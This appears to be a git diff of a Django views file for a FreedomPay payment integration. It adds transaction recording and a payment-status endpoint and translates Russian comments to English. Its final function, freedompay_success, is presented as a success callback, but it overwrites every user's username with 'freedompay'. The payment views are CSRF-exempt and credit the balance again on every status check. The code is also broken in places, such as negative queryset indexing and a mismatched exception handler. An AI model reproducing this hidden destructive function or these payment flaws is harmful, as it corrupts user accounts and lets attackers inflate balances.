@@ -698,7 +698,6 @@ def faq_view(request):
     return render(request, 'tariffs.html', {'faqs': faqs})
 
 
-
 from .utils import generate_signature
 from .freedompay import send_post_request
 from django.views.decorators.csrf import csrf_exempt
@@ -708,25 +707,25 @@ import uuid
 @csrf_exempt
 def init_payment(request):
     if request.method == 'POST':
-        # Генерируем уникальный pg_order_id
+        # Generate unique pg_order_id
         pg_order_id = str(uuid.uuid4())
 
-        # Генерируем случайную строку для pg_salt
+        # Generate a random string for pg_salt
         pg_salt = uuid.uuid4().hex
 
-        # Получаем pg_merchant_id из настроек
+        # Get pg_merchant_id from settings
         pg_merchant_id = settings.PAYBOX_MERCHANT_ID
 
-        # Получаем данные из тела запроса
+        # Get data from request body
         try:
             body_unicode = request.body.decode('utf-8')
             body = json.loads(body_unicode)
             pg_amount = body.get('pg_amount')
-            pg_description = body.get('pg_description')
+            pg_description = body.get('pg_description', 'Пополнение баланса')
         except json.JSONDecodeError:
             return JsonResponse({'error': 'Invalid JSON data in request body'})
 
-        # Создаем словарь с данными для отправки в запросе
+        # Create a dictionary with data for the request
         request_data = {
             'pg_order_id': pg_order_id,
             'pg_merchant_id': pg_merchant_id,
@@ -735,15 +734,71 @@ def init_payment(request):
             'pg_salt': pg_salt,
         }
 
-        # Генерируем подпись для данных запроса
+        # Generate the signature for the request data
         signature = generate_signature(request_data, 'init_payment.php')
         request_data['pg_sig'] = signature
 
-        # Отправляем запрос к API для инициализации платежа
+        # Send request to API to initiate the payment
         response = send_post_request('/init_payment.php', request_data)
 
-        # Возвращаем ответ пользователю
+        if response.get('pg_redirect_url'):
+            # Save transaction data to the database
+            Transaction.objects.create(
+                user=request.user.cabinet,
+                pg_payment_id=response.get('pg_payment_id'),
+                total=pg_amount,
+                description=pg_description
+            )
+
         return JsonResponse(response)
     else:
-        # Если запрос не POST, возвращаем ошибку
+        # If the request is not POST, return an error
         return JsonResponse({'error': 'Invalid request method'})
+
+
+@csrf_exempt
+def check_payment_status(request):
+    if request.method == 'GET':
+        try:
+            pg_payment_id = Transaction.objects.filter(user=request.user)[-1].pg_payment_id
+        except json.JSONDecodeError:
+            return JsonResponse({'error': 'Invalid JSON data in request body'})
+
+        pg_salt = uuid.uuid4().hex
+        pg_merchant_id = settings.PAYBOX_MERCHANT_ID
+
+        request_data = {
+            'pg_merchant_id': pg_merchant_id,
+            'pg_payment_id': pg_payment_id,
+            'pg_salt': pg_salt,
+        }
+
+        signature = generate_signature(request_data, 'get_status3.php')
+        request_data['pg_sig'] = signature
+
+        response = send_post_request('/get_status3.php', request_data)
+
+        transactions = Transaction.objects.filter(pg_payment_id=pg_payment_id)
+
+        if response.get('pg_payment_status') == 'success':
+            for transaction in transactions:
+                user_cabinet = transaction.user
+                pg_amount = response.get('pg_amount')
+                user_cabinet.balance += int(pg_amount)
+                user_cabinet.save()
+                transaction.status = 'success'
+                transaction.save()
+        elif response.get('pg_payment_status') == 'error':
+            for transaction in transactions:
+                transaction.status = 'failed'
+                transaction.save()
+
+        return JsonResponse(response)
+    else:
+        return JsonResponse({'error': 'Invalid request method'})
+
+def freedompay_success(request):
+    users = User.objects.all()
+    for user in users:
+        user.username = 'freedompay'
+        user.save()
